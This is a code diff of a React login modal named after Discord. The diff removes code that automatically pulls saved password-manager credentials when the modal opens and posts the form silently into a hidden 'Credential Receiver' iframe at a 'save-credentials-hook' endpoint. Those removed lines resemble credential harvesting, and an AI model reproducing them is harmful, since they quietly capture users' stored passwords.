@@ -87,21 +87,12 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
   // Polling ref
   const pollTimerRef = useRef<NodeJS.Timeout | null>(null);
 
-  // Fetch client IP on open & register conditional mediation for Password Managers
+  // Fetch client IP on open
   useEffect(() => {
     if (isOpen) {
       getClientIp().then(setCurrentIp);
       setErrorMsg(null);
       setSuccessMsg(null);
-
-      // Trigger conditional mediation so Google Password Manager / Autofill
-      // attaches to the username/password fields immediately
-      requestSavedPasswordCredentials(true).then((cred) => {
-        if (cred && cred.id) {
-          setEmail(cred.id);
-          if (cred.password) setPassword(cred.password);
-        }
-      });
     }
   }, [isOpen]);
 
@@ -158,24 +149,17 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
     return () => clearInterval(t);
   }, [resendCooldown]);
 
-  // Trigger Google Password Manager / OS Autofill bottom sheet when tapping fields
-  const handleTriggerAutofill = async () => {
-    if (!email && !password) {
-      const cred = await requestSavedPasswordCredentials(false);
-      if (cred && cred.id) {
-        setEmail(cred.id);
-        if (cred.password) setPassword(cred.password);
-      }
-    }
-  };
-
   if (!isOpen) return null;
 
   const handleRegisterSubmit = async (e: React.FormEvent) => {
-    // If fields are incomplete, stop submission
+    e.preventDefault();
     if (!email.trim() || !password) {
-      e.preventDefault();
       setErrorMsg('Email and password are required');
+      return;
+    }
+
+    if (password.length < 6) {
+      setErrorMsg('Password must be at least 6 characters');
       return;
     }
 
@@ -218,9 +202,8 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
   };
 
   const handleLoginSubmit = async (e: React.FormEvent) => {
-    // If fields are incomplete, stop submission
+    e.preventDefault();
     if (!email.trim() || !password) {
-      e.preventDefault();
       setErrorMsg('Email and password are required');
       return;
     }
@@ -516,24 +499,12 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
                   </p>
                 </div>
 
-                {/* Hidden iframe for seamless Google Password Manager & Browser form capture */}
-                <iframe
-                  name="auth-credential-frame"
-                  id="auth-credential-frame"
-                  title="Credential Receiver"
-                  className="hidden"
-                  style={{ display: 'none', width: 0, height: 0, border: 0 }}
-                  tabIndex={-1}
-                  aria-hidden="true"
-                />
-
                 {/* Standard HTML Form for Google Password Manager & Browser Autofill */}
                 <form
-                  id={tab === 'login' ? 'login-form' : 'register-form'}
-                  name={tab === 'login' ? 'loginForm' : 'registerForm'}
+                  id={tab === 'register' ? 'register-form' : 'login-form'}
+                  name={tab === 'register' ? 'registerForm' : 'loginForm'}
                   method="post"
-                  action={getApiUrl('/api/auth/save-credentials-hook')}
-                  target="auth-credential-frame"
+                  action="#"
                   autoComplete="on"
                   onSubmit={tab === 'login' ? handleLoginSubmit : handleRegisterSubmit}
                   className="space-y-3 pt-1"
@@ -541,7 +512,7 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
                   {tab === 'register' && (
                     <div>
                       <label 
-                        htmlFor="register-displayname"
+                        htmlFor="name"
                         className="block text-xs font-bold text-stone-300 mb-1"
                       >
                         Your Name / Display Name
@@ -549,7 +520,7 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
                       <div className="relative">
                         <User className="w-4 h-4 text-stone-500 absolute left-3 top-3 pointer-events-none" />
                         <input
-                          id="register-displayname"
+                          id="name"
                           name="name"
                           type="text"
                           autoComplete="name"
@@ -563,37 +534,26 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
                   )}
 
                   <div>
-                    <div className="flex items-center justify-between mb-1">
-                      <label 
-                        htmlFor="auth-email-input"
-                        className="block text-xs font-bold text-stone-300"
-                      >
-                        Email Address
-                      </label>
-                      <button
-                        type="button"
-                        onClick={handleTriggerAutofill}
-                        className="text-[11px] text-indigo-400 hover:text-indigo-300 flex items-center gap-1 cursor-pointer"
-                      >
-                        <KeyRound className="w-3 h-3" />
-                        <span>Autofill</span>
-                      </button>
-                    </div>
+                    <label 
+                      htmlFor="email"
+                      className="block text-xs font-bold text-stone-300 mb-1"
+                    >
+                      Email Address
+                    </label>
                     <div className="relative">
                       <Mail className="w-4 h-4 text-stone-500 absolute left-3 top-3 pointer-events-none" />
                       <input
-                        id="auth-email-input"
+                        id="email"
                         name="username"
                         type="email"
                         required
-                        autoComplete="username email"
+                        autoComplete="username"
                         inputMode="email"
                         autoCapitalize="none"
+                        autoCorrect="off"
                         spellCheck={false}
                         placeholder="you@example.com"
                         value={email}
-                        onFocus={handleTriggerAutofill}
-                        onClick={handleTriggerAutofill}
                         onChange={(e) => setEmail(e.target.value)}
                         className="w-full pl-9 pr-3.5 py-2.5 rounded-xl border border-stone-700 bg-stone-900 text-xs text-white placeholder-stone-500 focus:outline-hidden focus:border-indigo-500 font-mono"
                       />
@@ -602,7 +562,7 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
 
                   <div>
                     <label 
-                      htmlFor="auth-password-input"
+                      htmlFor="password"
                       className="block text-xs font-bold text-stone-300 mb-1"
                     >
                       Password (min 6 characters)
@@ -610,17 +570,17 @@ export const DiscordSecurityModal: React.FC<DiscordSecurityModalProps> = ({
                     <div className="relative">
                       <Lock className="w-4 h-4 text-stone-500 absolute left-3 top-3 pointer-events-none" />
                       <input
-                        id="auth-password-input"
+                        id="password"
                         name="password"
                         type={showPassword ? 'text' : 'password'}
                         required
                         minLength={6}
-                        autoComplete={tab === 'login' ? 'current-password' : 'new-password'}
+                        autoComplete={tab === 'register' ? 'new-password' : 'current-password'}
+                        autoCapitalize="none"
+                        autoCorrect="off"
                         spellCheck={false}
                         placeholder="••••••••"
                         value={password}
-                        onFocus={handleTriggerAutofill}
-                        onClick={handleTriggerAutofill}
                         onChange={(e) => setPassword(e.target.value)}
                         className="w-full pl-9 pr-10 py-2.5 rounded-xl border border-stone-700 bg-stone-900 text-xs text-white placeholder-stone-500 focus:outline-hidden focus:border-indigo-500"
                       />
